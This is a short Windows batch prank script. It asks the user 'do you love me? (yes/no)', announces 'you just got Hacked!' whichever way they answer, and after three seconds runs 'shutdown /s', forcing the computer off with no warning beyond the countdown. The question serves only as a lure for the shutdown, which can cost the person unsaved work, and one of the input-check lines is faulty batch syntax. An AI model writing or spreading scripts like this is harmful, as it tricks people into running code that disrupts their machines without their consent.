@echo off
:1
color a
echo do you love me? (yes/no)
set /p input=
if /i %input%==Yes goto love
if /i %input%==no goto hate
if /i not %input%== Yes,no goto 1

:love
echo I love you to but........
echo you just got Hacked!
timeout 3
shutdown /s

:hate
echo yeah i also hate you and........
echo you just got Hacked!
timeout 3
shutdown /s